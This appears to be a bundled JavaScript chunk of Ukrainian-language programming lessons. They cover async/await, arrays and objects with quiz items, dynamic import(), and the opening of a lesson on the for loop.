9\n\n◘◘![ico-25 cap] ** 9**◘◘\n\n~~~js\nasync function getUser (userNum) {\n  return (await (await fetch(`https://api.github.com/users/${userNum}`)).json()).name\n}\n\ngetUser(5)\n  .then(console.log)\n~~~\n\n**Output**:\n\n••Yuriy Semchyshyn••\n\n_____________________________________\n\n### ![ico-25 cap] 10\n\n◘◘![ico-25 cap] **10**◘◘\n\n~~~js\nconst browsers = ['Chrome', 'Mozilla', 'Safari', 'IE']\n\nbrowsers.then = (function () {\n  let current = 0\n\n  return function (resolve) {\n    const response = {\n      value: this[current++],\n      done: current > this.length\n    }\n\n    setTimeout(() => resolve.call(null, response), 1000)\n  }\n})()\n\nasync function showBrowsers () {\n  do {\n    var { done, value } = await browsers\n\n    console.log(`{ value: ${value}, done: ${done} }`)\n  } while (!done)\n}\n\nshowBrowsers ()\n~~~\n\n{{{async-await-6.js}}}\n\n____________________________________________________________\n\n### ![ico-25 cap] 11\n\n◘◘![ico-25 cap] **11**◘◘\n\n~~~js\n(function demo (maxValue) {\n  const placeholder = document.body\n    .appendChild(document.createElement('h3'))\n\n  while (maxValue--) {\n    const number = maxValue\n    setTimeout(async () => Object.assign(placeholder, {\n      innerText: await number\n    }), number * 1000)\n  }\n})(10)\n~~~\n\n{{{async-await-11.js}}}\n\n____________________________________________________________\n\n### ![ico-25 cap] 12\n\n◘◘![ico-25 cap] **12**◘◘\n\n~~~js\n;(async () => await 'async-await')().then(console.log)\n\nPromise.resolve('promise').then(console.log)\n\n;(async () => 'async')().then(console.log)\n~~~\n\n~~~console\npromise\nasync\nasync-await\n~~~\n\nЗауважимо, що:\n\n1. Проміс, який повертає функція ~async () => await 'async-await'~, розрізолвився останнім, хоча це перший рядок коду.\n2. Першим розрізолвився ~Promise.resolve('promise')~ (другий рядок коду).\n3. Другим розрізолвився проміс, повернутий функцією ~async () => 'async'~ (третій рядок коду).\n\nЗробив \"рокіровку\" другої і третьої стрічок коду:\n\n~~~js\n;(async () => await 'async-await')().then(console.log)\n\n;(async () => 'async')().then(console.log)\n\nPromise.resolve('promise').then(console.log)\n~~~\n\nми побачимо, що порядок виведення консоль змінився відповідним чином:\n\n~~~console\nasync\npromise\nasync-await\n~~~\n\nтобто їх колбеки потрапляють в чергу мікротасків в тій же послідовності, в якій вони з'явилися в коді.\n\nА ось з функцією ~async () => await 'async-await'~ все інакше.\n\nПокажемо, що код:\n\n~~~js\n;(async () => await 'async-await-1')().then(console.log)\n~~~\n\nпрацює ідентично до коду:\n\n~~~js\nnew Promise(resolve => resolve('async-await-2'))\n  .then(response => response)\n  .then(console.log)\n~~~\n\nДля цього запустимо їх спочатку у такій послідовності:\n\n~~~js\n;(async () => await 'async-await-1')().then(console.log)\n\nnew Promise(resolve => resolve('async-await-2'))\n  .then(response => response)\n  .then(console.log)\n~~~\n\n~~~console\nasync-await-1\nasync-await-2\n~~~\n\nа потім змінимо порядок їх проходження:\n\n~~~js\nnew Promise(resolve => resolve('async-await-2'))\n  .then(response => response)\n  .then(console.log)\n\n;(async () => await 'async-await-1')().then(console.log)\n~~~\n\n~~~console\nasync-await-2\nasync-await-1\n~~~\n\nЯк ми бачимо, вони резолвуються строго в порядку їхнього слідування в коді.\nТобто появлення ключового слова **~await~** подовжує на 1 ланцюг колбеків, що проходять через Event Loop, і це призводить до того, що в прикладі 12 останнім \"вийде на фініш\" ~;(async () => await 'async-await')().then(console.log)~.\n\nЯк ми вже говорили раніше, сама асинхронна функція переривається в точці, де зустрічається **~await~**, і залишок коду цієї функції, який не був виконаний до цього, сам стає колбеком і \"відходить\" у **Event Loop**, щоб звільнити стек викликів та дати можливість колбеку повернутися з результатом. Тому ланцюжок подовжується на 1 мікротаск.\n\n______________________________________________\n\n### ![ico-25 cap] 13\n\n◘◘![ico-25 cap] **13**◘◘\n\n~~~js\nconst promise = message => new Promise(resolve => {\n  const time = Math.round(Math.random() * 3000)\n  setTimeout(() => resolve(`${message}: ${time}`), time)\n})\n\nconst test = async () => await promise(await promise(await promise('start')))\n\ntest().then(response => console.log(response))\n~~~\n\n{{{async-await-13.js}}}\n\n______________________________________________\n\n### ![ico-25 cap] 14\n\nОголосимо допоміжну функцію:\n\n~~~js\nconst createElem = tag => document.body.appendChild(document.createElement(tag))\n~~~\n\n◘◘![ico-25 cap] **14**◘◘\n\n~~~js\nconst promise = message => new Promise(resolve => Object.assign(createElem('input'), {\n  placeholder: message,\n  style: `\n    padding: 8px 16px;\n    border-radius: 4px;\n  `,\n  onchange: event => resolve(event.target.value)\n}))\n\nconst func = async () => Object.assign({}, {\n  name: await promise('Your name'),\n  hobby: await promise('Your hobby'),\n  speciality: await promise('Your speciality')\n})\n\nfunc().then(response => console.log(response))\n~~~\n\n{{{async-await-9.js}}}\n\n______________________________________________\n\n### ![ico-25 cap] 15\n\n◘◘![ico-25 cap] **15**◘◘\n\n~~~JS\nconst promise = message => new Promise(resolve => Object.assign(createElem('input'), {\n  placeholder: message,\n  onchange: event => resolve(event.target.value)\n}))\n\nconst func = async () => {\n  const user = {}\n  const messages = ['name', 'hobby', 'speciality']\n\n  const responses = await Promise.all(messages.map(message => promise(message)))\n\n  responses.forEach((val, index) => Object.assign(user, { [messages[index]]: val }))\n  return user\n}\n\nfunc().then(console.log)\n~~~\n\n{{{async-await-10.js}}}\n\n______________________________________________\n\n### ![ico-25 cap] 16\n\nЗафіксуємо значення поточного часу в змінній **~start~** і оголосимо допоміжні функції **~getRandom~** і **~test~**:\n\n~~~js\nconst start = Date.now()\n\nconst getRandom = () => Math.round(Math.random() * 5000)\n\nconst test = ms => Date.now() - start >= ms\n~~~\n\nТепер оголосимо функції **~func~** і **~createPromise~**:\n\n~~~js\nfunction func (name, time, callback) {\n  test(time)\n    ? callback(`${name}: ${time}`)\n    : requestAnimationFrame(func.bind(null, name, time, callback))\n}\n\nfunction createPromise (name, time) {\n  return new Promise(func.bind(null, name, time))\n}\n~~~\n\nТепер запустимо код:\n\n◘◘![ico-25 cap] **16**◘◘\n\n~~~js\n;['First', 'Second', 'Third']\n  .forEach(name => createPromise(name, getRandom()).then(console.log))\n~~~\n\n{{{async-await-16.js}}}\n\nЯк бачите, повідомлення відображаються у випадковому порядку, залежно від того, яке значення повертала функція **~getRandom~** для кожного промісу.\nЗадача - синхронізувати потрапляння колбеків у стек викликів так, щоб спочатку в консолі вивелося \"**_First_**\", потім \"**_Second_**\", а потім \"**_Third_**\".\n\n◘◘**Ланцюжок промісів**◘◘\n\n~~~js\ncreatePromise('First', getRandom())\n  .then(console.log)\n  .then(() => createPromise('Second', getRandom()).then(console.log))\n  .then(() => createPromise('Third', getRandom()).then(console.log))\n~~~\n\n◘◘**Асинхронна функція**◘◘\n\n~~~js\nconst showResults = async () => {\n  const promises = ['First', 'Second', 'Third']\n    .map(name => createPromise(name, getRandom()))\n\n  for (const promise of promises) console.log(await promise)\n}\n\nshowResults()\n~~~\n\nОтже, асинхронна функція може слугувати «обгорткою» для кількох асинхронних операцій, виконання яких потрібно впорядкувати в часі, тобто зробити так, щоб їхні колбеки відпрацьовували в заданій послідовності.\n\n________________________________\n\n### ![ico-25 cap] 17\n\nРозглянемо суто умоглядний варіант\n(на практиці таке робити не треба):\n\n◘◘![ico-25 cap] **17**◘◘\n\n~~~js\nconst origin = 'https://garevna-json-server.glitch.me'\n\nconst users = ['Stephan', 'Andry']\n  .reduce(async (result, item) => {\n    const data = await (await fetch(`${origin}/users?name=${item}`)).json()\n    result = await result\n    result.push(data[0])\n    return result\n  }, [])\n~~~\n\nНа що тут слід звернути увагу:\n\nметоду **~reduce~** передається асинхронна функція, яка повертає екземпляр ~Promise~.\nТому після кожної ітерації змінна **~result~** буде посиланням на екземпляр ~Promise~,\nякий треба резолвити за допомогою **~await~**.\n\nУ результаті роботи скрипта у змінній **~users~** буде екземпляр ~Promise~.\nВитягнемо результат:\n\n~~~js\nusers.then(console.log)\n~~~\n\n![ico-20 yes] Увага, щоб скоротити кількість звернень до сервера, краще зробити так:\n\n~~~js\nfetch(`${origin}/users?name=Stephan&name=Andry`)\n  .then(response => response.json())\n  .then(console.log)\n~~~\n\nили так:\n\n~~~js\nconst origin = 'https://garevna-json-server.glitch.me'\n\nconst getEndpoint = userList => userList\n  .reduce((result, item, index) => result += `${index > 0 ? '&' : ''}name=${item}`, '')\n\nconst getUsers = async userList => await (await fetch(`${origin}/users?${getEndpoint(userList)}`)).json()\n\ngetUsers(['Stephan', 'Andry'])\n  .then(console.log)\n~~~\n\n___________________________________________\n\n### ![ico-25 cap] 18\n\n~~~js\nconst origin = 'https://api.github.com'\n\nconst addElem = tagName => document.body\n  .appendChild(document.createElement(tagName))\n~~~\n\n◘◘![ico-25 cap] **18**◘◘\n\n~~~js\nasync function getUsersData (userName) {\n  const userData = await (await fetch(`${origin}/users/${userName}`)).json()\n\n  addElem('img').src = userData.avatar_url\n\n  const userRepos = await (await fetch(userData.repos_url)).json()\n\n  for (const item of userRepos) addElem('div').innerText = item.events_url\n\n  return 'Ready'\n}\n\ngetUsersData('garevna').then(console.log)\n~~~\n\n_________________________________________\n\n### ![ico-25 cap] 19\n\nРозширимо прототип конструктора **~Object~** методом **~addElem~**:\n\n◘◘Object◘◘\n~~~js\nObject.prototype.addElem = function (tagName) {\n  const elem = document.body\n    .appendChild(document.createElement(tagName))\n  Object.assign(elem, {\n    addChar (char) {\n      elem.textContent += char\n    },\n    replace (text) {\n      elem.textContent = text\n    }\n  })\n  return elem\n}\n~~~\n\nЯк ми можемо бачити, доданий елемент матиме два методи: **~addChar~** та **~replace~**, які дозволяють змінювати текстовий вміст елемента.\n\nТепер розширимо прототип конструкторів **~String~** та **~Number~** методом **~then~**:\n\n◘◘String◘◘\n~~~js\nString.prototype.then = function () {\n  const placeholder = this.addElem('div')\n  this\n    .split('')\n    .forEach((char, index) => setTimeout(() => placeholder.addChar(char), 1000 * index))\n}\n~~~\n\n◘◘Number◘◘\n\n~~~js\nNumber.prototype.then = function () {\n  const placeholder = this.addElem('div')\n  for (let ind = 0; ind <= this; ind++) {\n    setTimeout(() => placeholder.replace(ind), 1000 * ind)\n  }\n}\n~~~\n\nТепер ви можете створити \"простенькі\" функції **~typeWritter~** і **~showNumber~**:\n\n◘◘![ico-25 cap] **19**◘◘\n\n~~~js\nconst typeWritter = async string => await Object(string)\nconst showNumber = async number => await Object(number)\n\ntypeWritter('Welcome')\nshowNumber(11)\n~~~\n\n_________________________________________\n\n[:::**20**:::](https://plnkr.co/edit/3JMiqa1CFLK55hgx/)\n\n_______________________\n[![ico-30 hw] Quiz](quiz/async)\n"},81486:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-35 study] Структури даних\n\nВзагалі кажучи, тепер ми з вами приступаємо до вивчення **посилального типу даних**.\nСпробуємо розібратися, що ж це таке.\n\nПо-перше, коли ми говоримо про будь-які **структури даних**, ми маємо на увазі якийсь набір даних, зібраних під одним ім'ям.\nНаприклад, список студентів групи або список учнів класу є структурою даних, тому що містить десятки строкових значень (змінних типу 'string').\nОднак якщо ви просите список студентів групи, ви не будете перераховувати вміст списку, тим більше, що ви можете і не знати його. Ви назвете шифр групи.\nТак виходить структура даних.\nІм'я одне, а даних, що зберігаються під цим ім'ям, може бути дуже багато.\n\nЧому такі типи даних є **посилальними**?\n\nТому, що якщо ви передаєте назву структури даних, то ви не передаєте при цьому її зміст.\nВи передаєте тільки **посилання** на структуру даних.\n\nЯкщо ми передаватимемо це посилання з однієї змінної в іншу, ми передаватимемо не групу, а **посилання** на неї.\n\nНаприклад, у вас є якась структура даних (наприклад, список студентів групи), посилання на яку зберігається у змінній **~group~**.\n\nПісля виконання присвоювання:\n\n~~~js\nvar students = group\n~~~\n\nу змінній **~students~** буде посилання на ту саму структуру даних.\nНової структури даних при цьому не створюється, передається тільки **посилання**.\n\n@@@@\n![](illustrations/reference-is-a-lockpick-ua.svg)\n<br>Якщо у вас є посилання на структуру даних, ви отримуєте доступ до вмісту цієї структури даних за посиланням.<br>\n@@@@\n\nДавайте познайомимося ближче зі структурами даних у JS. Принаймні, з двома з них - масивами та об'єктами.\nВони відрізняються за способом організації доступу до елементів структури даних.\nУ масивах елементи строго вишикувані за порядком, і доступ до них здійснюється за їхнім порядковим номером усередині колекції.\nВ об'єктах немає строго порядку слідування, і замість порядкового номера елементи такої колекції (структури) мають унікальні ідентифікатори, за якими ми можемо знайти їх у колекції.\n\n_________________________________________________\n\n## ![ico-30 icon] Массивы\n\n**тип даних: ~object~**\n\n• Масив - це впорядкований набір змінних.\n• Кожна змінна називається **елементом масиву**.\n• Елементи масиву мають порядковий номер (**_індекс_** елемента масиву).\n\n![ico-20 warn] Індексація елементів масиву починається з нуля, тобто перший елемент масиву матиме індекс ~ 0~.\n\nОголосити масив дуже просто:\n\n~~~js\nvar array = [3.14, false, 'mother', null, undefined]\n~~~\n\nТе, що ви бачите в правій частині оператора присвоювання - це **вираз**.\nПерш, ніж виконати присвоювання, движок завжди обчислює вираз у правій частині оператора присвоювання.\nА в правій частині оператора присвоювання движок бачить квадратні дужки з перерахуванням через кому значень всередині квадратних дужок.\nДвижок розуміє, що ми хочемо створити масив, і створює масив (точніше, він викликає для цього спеціальний конструктор, але про це ми поговоримо пізніше).\nДе движок розмістив створену структуру даних (масив) - ми ніколи не дізнаємося, бо нам він повернув тільки **посилання** на цей масив.\nСаме це посилання поміщено у змінну **~array~**.\n![ico-25 warn] Не масив, а **посилання** на масив.\n\nТепер доступ до вмісту масиву здійснюється таким чином:\n\n~~~js\narray[2]\n~~~\n\nтобто ми використовуємо для цього ім'я масиву, після якого вказуємо **індекс** елемента в квадратних дужках.\nІндекс - це порядковий номер, починаючи з нуля:\n\n| 0    | 1     | 2        | 3    | 4         |\n| 3.14 | false | 'mother' | null | undefined |\n\nУ результаті отримуємо значення елемента масиву:\n\n~~~console\n'mother'\n~~~\n\nМи маємо доступ до елементів масиву не тільки для читання.\nНаступне присвоювання змінить значення останнього елемента масиву:\n\n~~~js\narray[4] = 'father'\n~~~\n\nПісля цього присвоювання наш масив буде таким:\n\n~~~console\n► (5) [3.14, false, 'mother', null, 'father']\n~~~\n\n___________________________________\n\nЯкщо тепер ми виконаємо таке присвоєння:\n\n~~~js\nvar collection = array\n~~~\n\nто у змінній **~collection~** буде посилання на той самий масив.\n\nПеревіримо?\n\nДавайте змінимо елемент масиву **~collection~**:\n\n~~~js\ncollection[3] = 'brother'\n~~~\n\nі подивимося на масив **~array~**:\n\n~~~js\narray\n~~~\n\n~~~console\n► (5) [3.14, false, 'mother', 'brother', 'father']\n~~~\n\nЯк бачите, зміни, які ми внесли (за посиланням!) у масив **~collection~**, відобразилися в масиві **~array~**.\nЦе відбувається тому, що і змінна **~collection~**, і змінна **~array~** є **посиланнями на один і той самий масив**.\n\n_________________________________________________\n\n### ![ico-25 icon] length\n\nУ масивів, як і в рядків, є властивість **~length~** (довжина масиву, або число елементів масиву).\n\nДоступ до цієї властивості можливий у **крапковій нотації** (через крапку після імені масиву):\n\n~~~js\ncollection.length\n~~~\n\n~~~console\n5\n~~~\n\n_________________________________________\n\n### ![ico-25 hw] Tests\n\n◘◘![ico-20 hw] 1◘◘\n\n~~~js\nvar  students = ['Piter', 'Madelin', 'Gregory']\n~~~\n\n→→→ students[1] | 'Piter', 'Madelin', 'Gregory', null, undefinded | Madelin →→→\n\n◘◘![ico-20 hw] 2◘◘\n\n~~~js\nvar  students = ['Piter', 'Madelin', 'Gregory']\n~~~\n\n→→→ students[3] | 'Piter', 'Madelin', 'Gregory', null, undefinded | undefinded →→→\n\n◘◘![ico-20 hw] 3◘◘\n\n~~~js\nvar  students = ['Piter', 'Madelin', 'Gregory']\nvar group = students\ngroup[3] = 'Frodo'\n~~~\n\n→→→ students[3] | 'Piter', 'Madelin', 'Gregory', 'Frodo', null, undefinded | Frodo →→→\n\n◘◘![ico-20 hw] 4◘◘\n\n~~~js\nvar  students = ['Piter', 'Madelin', 'Gregory']\nvar group = []\ngroup[3] = students[0]\n~~~\n\n→→→ group.length | 0, 1, 2, 3, 4, undefinded | 4 →→→\n\n◘◘![ico-20 hw] 5◘◘\n\n~~~js\nvar  students = ['Piter', 'Madelin', 'Gregory']\nvar group = []\ngroup[0] = students\n~~~\n\n→→→ group.length | 0, 1, 2, 3 | 1→→→\n\n◘◘![ico-20 hw] 6◘◘\n\n~~~js\nvar  students = ['Frodo', 'Stephan', 'Madelin', 'Helen']\nvar hello = 'Hi ' + students[1] + '!'\n~~~\n\n→→→ hello | 'Hi !', 'Hi Frodo!', 'Hi Stephan!', 'Hi Madelin!', 'Hi Helen!' | Hi Stephan!→→→\n\n_____________________________________________________________\n\n## ![ico-25 icon] Об'єкти\n\n**тип даних: ~object~**\n\nЯкщо масиви ми створювали за допомогою квадратних дужок, то для створення об'єктів ми будемо використовувати фігурні дужки ~{}~.\nВміст масиву ми перераховували всередині квадратних дужок через кому.\nІндекси елементів у масиві визначалися автоматично на підставі порядку їхнього слідування під час перерахування.\nВміст об'єкта буде так само перераховуватися через кому, але є нюанс: **об'єкт не є впорядкованим набором елементів**.\nДані, які зберігатимуться в об'єкті, не матимуть індексів, а замість індексів ми використовуватимемо ключі, тобто текстові рядки (тип 'string').\nІ якщо дані в масиві ми називали **елементами масиву**, то дані в об'єкті ми будемо називати **властивостями об'єкта**.\nКожна властивість об'єкта має **ім'я** і **значення**.\n\nОсь так визначається об'єкт **~human~** з трьома властивостями: **~name~**, **~age~** і **~employed~**:\n\n◘◘![ico-25 cap] 5◘◘\n\n~~~js\nvar human = {\n  name: 'Frodo',\n  age: 35,\n  employed: true\n}\n~~~\n\nЩоб движок зрозумів вас правильно, властивості об'єкта, що перераховуються всередині фігурних дужок, мають бути виразом ~ім'я: значення~.\n\nІм'я властивості є **ключем** для доступу до значення властивості, так само, як індекс елемента масиву є ключем для доступу до елемента масиву.\nМи можемо використовувати **крапкову нотацію** для доступу до властивостей об'єкта:\n\n~~~js\nhuman.name\n~~~\n\n~~~console\n'Frodo'\n~~~\n\nОднак можна так само використовувати нотацію квадратних дужок, як у масивів, тільки замість цілочисельних індексів усередині квадратних дужок вказуються ключі, тобто рядки:\n\n~~~js\nhuman['name']\n~~~\n\n~~~console\n'Frodo'\n~~~\n\nЧому така нотація буває зручнішою за точкову?\n\nПрипустимо, що ім'я ключа в нас міститься у змінній:\n\n~~~js\nvar propName = 'name'\n~~~\n\nТоді ми можемо отримати значення властивості об'єкта за ключем, що зберігається у змінній **~propName~**:\n\n~~~js\nhuman[propName]\n~~~\n\n~~~console\n'Frodo'\n~~~\n\nМи досить легко можемо додавати властивості об'єкту звичайним присвоюванням:\n\n~~~js\nhuman.hobby = ['sport', 'reading']\n~~~\n\nПісля такого присвоювання об'єкт **~human~** у консолі матиме такий вигляд:\n\n~~~console\n▼ {name: 'Frodo', age: 35, employed: true, hobby: Array(2)}\n    age: 35\n    employed: true\n    hobby: (2) ['sport', 'reading']\n    name: \"Frodo\"\n  ► [[Prototype]]: Object\n~~~\n\nПозже мы с вами узнаем, что это за свойство ~[[Prototype]]: Object~, которого мы с вами не добавляли объекту, но которое будет присутствовать в любом объекте.\n\nДля удаления свойств нужно использовать оператор **~delete~**:\n\n~~~js\ndelete human.hobby\n~~~\n\nЦей оператор можна застосовувати тільки до властивостей об'єкта, і він повертає логічне значення ~true~ або ~false~ залежно від того, відбулося видалення чи ні.\n\n________________________________________________________\n\n### ![ico-25 hw] Tests\n\n◘◘![ico-20 hw] 1◘◘\n\n~~~js\nvar memo = [1, false, 4.8, 'Google', [0, 1]]\n~~~\n\n→→→ typeof memo[4] | 'string', 'number', 'boolean', 'object', undefinded | object →→→\n\n◘◘![ico-20 hw] 2◘◘\n\n~~~js\nvar memo = [1, false, 4.8, 'Google', { name: 'Figaro' }]\n~~~\n\n→→→ typeof memo[4] | 'string', 'number', 'boolean', 'object', undefinded | object →→→\n\n◘◘![ico-20 hw] 3◘◘\n\n~~~js\nvar memo = [1, false, 4.8, 'Google', { name: 'Figaro' }]\n~~~\n\n→→→ typeof memo[4].name | 'string', 'number', 'boolean', 'object', undefinded | string →→→\n\n◘◘![ico-20 hw] 4◘◘\n\n~~~js\nvar list = [{ name: 'Google' }, { name: 'Mozilla' }, { name: 'Microsoft' }, { name: 'Apple' }]\n~~~\n\n→→→ typeof list | 'string', 'number', 'boolean', 'object', undefinded | object →→→\n\n◘◘![ico-20 hw] 5◘◘\n\n~~~js\nvar list = [{ name: 'Google' }, { name: 'Mozilla' }, { name: 'Microsoft' }, { name: 'Apple' }]\n~~~\n\n→→→ typeof list[0] | 'string', 'number', 'boolean', 'object', undefinded | object →→→\n\n◘◘![ico-20 hw] 5◘◘\n\n~~~js\nvar list = [{ name: 'Google' }, { name: 'Mozilla' }, { name: 'Microsoft' }, { name: 'Apple' }]\n~~~\n\n→→→ typeof list[0].name | 'string', 'number', 'boolean', 'object', undefinded | string →→→\n\n◘◘![ico-20 hw] 6◘◘\n\n~~~js\nvar  students = {\n  group: 'Dev-05',\n  course: 'Programming',\n  names: [\n    'Piter Clark',\n    'Helen Surmot',\n    'Pavel Farios',\n    'Alex Figa',\n    'Gregory Trump'\n  ]\n}\n~~~\n\n→→→ students.group | 'Dev-05', 'Programming', 'Piter Clark', 'Helen Surmot', 'Pavel Farios', 'Alex Figa', 'Gregory Trump', undefinded | Dev-05 →→→\n\n◘◘![ico-20 hw] 7◘◘\n\n~~~js\nvar  students = {\n  group: 'Dev-05',\n  course: 'Programming',\n  names: [\n    'Piter Clark',\n    'Helen Surmot',\n    'Pavel Farios',\n    'Alex Figa',\n    'Gregory Trump'\n  ]\n}\n~~~\n\n→→→ students[1] | 'Piter Clark', 'Helen Surmot', 'Pavel Farios', 'Alex Figa', 'Gregory Trump', undefinded | undefinded →→→\n\n◘◘![ico-20 hw] 8◘◘\n\n~~~js\nvar  students = {\n  group: 'Dev-05',\n  course: 'Programming',\n  names: [\n    'Piter Clark',\n    'Helen Surmot',\n    'Pavel Farios',\n    'Alex Figa',\n    'Gregory Trump'\n  ]\n}\n~~~\n\n→→→ students.names[1] | 'Piter Clark', 'Helen Surmot', 'Pavel Farios', 'Alex Figa', 'Gregory Trump', undefinded | Helen Surmot →→→\n\n◘◘![ico-20 hw] 9◘◘\n\n~~~js\nvar  students = [\n  {\n    name: 'Piter Clark',\n    homeworks: [10, 7, 8, 5, 9, 6, 4, 8, 7]\n  },\n  {\n    name: 'Helen Surmot',\n    homeworks: [5, 4, 7, 6, 8, 7, 7, 6, 8]\n  },\n  {\n    name: 'Pavel Farios',\n    homeworks: [9, 8, 9, 10, 7, 7, 8, 6, 8]\n  },\n  {\n    name: 'Alex Figa',\n    homeworks: [4, 5, 4, 6, 7, 5, 6, 7, 8]\n  },\n  {\n    name: 'Gregory Trump',\n    homeworks: [3, 5, 4, 6, 5, 7, 6, 6, 7]\n  }\n]\n~~~\n\n→→→ students[4].name | 'Piter Clark', 'Helen Surmot', 'Pavel Farios', 'Alex Figa', 'Gregory Trump', undefinded | Gregory Trump →→→\n\n◘◘![ico-20 hw] 10◘◘\n\n~~~js\nvar  students = [\n  {\n    name: 'Piter Clark',\n    homeworks: [10, 7, 8, 5, 9, 6, 4, 8, 7]\n  },\n  {\n    name: 'Helen Surmot',\n    homeworks: [5, 4, 7, 6, 8, 7, 7, 6, 8]\n  },\n  {\n    name: 'Pavel Farios',\n    homeworks: [9, 8, 9, 10, 7, 7, 8, 6, 8]\n  },\n  {\n    name: 'Alex Figa',\n    homeworks: [4, 5, 4, 6, 7, 5, 6, 7, 8]\n  },\n  {\n    name: 'Gregory Trump',\n    homeworks: [3, 5, 4, 6, 5, 7, 6, 6, 7]\n  }\n]\n~~~\n\n→→→ students[4].homeworks[1] | 7, 10, 8, 4, 5, 9, undefinded | 5 →→→\n\n________________________________________________________\n\n[![ico-20 link] MDN](external/mdn-data-structures)\n"},50794:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-25 study] Dynamic import\n\n**ES 2019**\n\n__________________________________________________\n\nТепер у нас є вибір між статичним (**~import~**) та динамічним (**~import()~**) імпортом.\n\nДинамічний імпорт представлений новою функцією **~import()~**, яка повертає проміс.\n\n![ico-25 warn] Строго кажучи, **~import()~** не є функцією в сенсі успадкування від **~Function~**, це взагалі не об'єкт.\n\n_________________________________\n\n![ico-30 cap] ** 1**\n\nЗапустіть у консолі наведений нижче код.\n\n~~~js\ndocument.body.onclick = async () => {\n  const module = await import('https://garevna.github.io/js-samples/js/index21.js')\n}\n~~~\n\n^^![ico-20 speach] Примітно, що у файлі **~index21.js~** немає директиви **_~export~_**.^^\n^^Однак імпорт спрацював, і скрипт запустився.^^\n\n{{{dynamic-import-1.js}}}\n\n____________________________________\n\n![ico-30 cap] ** 2**\n\n^^У цьому прикладі скрипти імпортуються динамічно, послідовно, із затримкою в кілька секунд.^^\n\n◘◘![ico-20 paper]◘◘\n\n~~~js\nconst scriptPath = 'https://garevna.github.io/js-samples/js/index'\n\nimport(`${scriptFile}12.js`)\n  .then(module => setTimeout(() => import(`${scriptPath}21.js`)))\n  .then(setTimeout(() => import(`${scriptPath}22.js`), 10000))\n~~~\n\n^^Використовуємо асинхронну функцію для спрощення коду:^^\n\n◘◘![ico-20 paper]◘◘\n\n~~~js\nconst scriptImports = async moduleFile => {\n  const timeOut = timeInterval => new Promise(resolve => setTimeout(() => resolve(), timeInterval))\n\n  await import(`${moduleFile}12.js`)\n  await timeOut(8000)\n  await import(`${moduleFile}21.js`)\n  await timeOut(12000)\n  await import(`${moduleFile}22.js`)\n}\n\nscriptImports('https://garevna.github.io/js-samples/js/index')\n~~~\n\n_____________________________________________________\n\n![ico-30 cap] ** 3**\n\nПрипустимо, що у розмітці ми підключили скрипт **~index.js~**\n\n◘◘^^![ico-20 paper] index.html^^◘◘\n\n~~~html\n&lt;!DOCTYPE html>\n&lt;html>\n  &lt;head>\n    &lt;meta charset=\"utf-8\">\n    &lt;title>ES Modules&lt;/title>\n&lt;/head>\n\n  &lt;body>\n    &lt;script src=\"js/index.js\">&lt;/script>\n  &lt;/body>\n\n&lt;/html>\n~~~\n\nКод файлу **~index.js~** створює елемент ~&lt;script>~ з атрибутом **~type=\"module\"~** і вставляє його на сторінку:\n\n~~~js\nconst mod = document.body\n  .appendChild(document.createElement('script'))\nmod.type = 'module'\n~~~\n\nВ елемент ~&lt;script>~ міститься код, який імпортує функцію **_~showMessage~_** з файлу **~js/testESModules.js~**\n\nі викликає її з текстом \"_Hi, students! Welcome to new age of ES Modules!_\".\n\n~~~js\nmod.textContent = `\n  import { showMessage } from './js/testESModules.js'\n  showMessage('Hi, students! Welcome to new age of ES Modules!')\n`\n~~~\n\nПовний код:\n\n◘◘^^![ico-20 paper] js/index.js^^◘◘\n\n~~~js\nconst mod = document.body\n  .appendChild(document.createElement('script'))\n\nmod.type = 'module'\n\nmod.textContent = `\n  import { showMessage } from './js/testESModules.js'\n  showMessage('Hi, students! Welcome to new age of ES Modules!')\n`\n~~~\n\nІменований експорт у файлі **~js/testESModules.js~**:\n\n◘◘^^![ico-20 paper] js/testESModules.js^^◘◘\n\n~~~js\nexport function showMessage (message) {\n  const demo = document.body.appendChild(document.createElement('div'))\n  demo.style = `\n    position: fixed;\n    top: 15%; left: 15%;\n    bottom: 15%; right: 15%;\n    box-shadow: 8px 8px 12px #00000090;\n    border: solid 0.5px #bbb;\n    padding: 32px;\n    z-index: 300;\n    background-color: #000;\n  `\n  demo.innerHTML = `\n    <h2 style='color: #789'>Module was successfully imported</h2>\n    <p style='color: #fa0'>Now you can see how it works :)</p>\n    <hr>\n    <p style='color: #dde'>${message}</p>\n  `\n  setTimeout(() => document.body.removeChild(demo), 10000)\n}\n~~~\n\n{{{dynamic-import-3.js}}}\n\n__________________________________________________________\n\n![ico-20 warn] При імпорті модулів слід зазначати або повний шлях:\n\n~~~js\nimport { showMessage } from 'https://example.com/js/testESModules.js'\n~~~\n\nабо відносний шлях, що починається з ~ /~, ~./~ або ~../~:\n\n~~~js\nimport { showMessage } from './js/testESModules.js'\n~~~\n\nІнакше імпорт завершиться невдачею.\n\n________________________________________________________________________\n\n\n[![ico-25 cap] **Live demo**](samples/25)\n\n______________________________________________________________________\n"},6236:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-35 study] Оператор for\n\nНу, ось ми і дісталися до третього основоположного принципу структурного програмування - до циклів.\nЯк ми вже, я сподіваюся, знаємо, цикл - це повторення одних і тих самих дій кілька разів.\nТобто є якийсь код, який має бути виконаний неодноразово.\nЦей код поміщається у фігурні дужки **~{}~** і називається **тілом циклу**.\n\nКожне повторення циклу називається **ітерацією циклу**.\n\nТаким чином, будь-який оператор циклу матиме тіло, і це тіло завжди поміщене у фігурні дужки.\nАле в кожного циклу є одне важливе завдання: вчасно зупинитися.\nМи ж не можемо нескінченно повторювати виконання коду у фігурних дужках.\nНескінченний цикл - це підвисання вкладки браузера. Нам це точно ні до чого.\n\nОтже, цикл потрібно вчасно зупинити.\nДля цього визначити, коли цикл має бути зупинений.\n\nЄ варіанти:\n- Прямо вказати, скільки разів має бути виконано цикл;\n- Задати якусь умову, при виконанні якої цикл буде повторюватися. Така умова (якийсь вираз) завжди поміщається в круглі дужки.\nУмова циклу може бути будь-яким обчислювальним виразом (тобто синтаксично коректним), але після обчислення значення цього виразу движок завжди приведе його до логічного типу (**~true~** або **~false~**).\n\nОтже, у будь-якого оператора циклу є три обов'язкові частини: **назва оператора** (ключове слово), **умова** у круглих дужках і **тіло** у фігурних дужках.\n\nМи починаємо нашу подорож циклами з оператора циклу **~for~**.\n\n## ![ico-30 icon] Syntax\n\nДля оператора циклу **~for~** потрібна змінна-лічильник (змінна циклу), яка 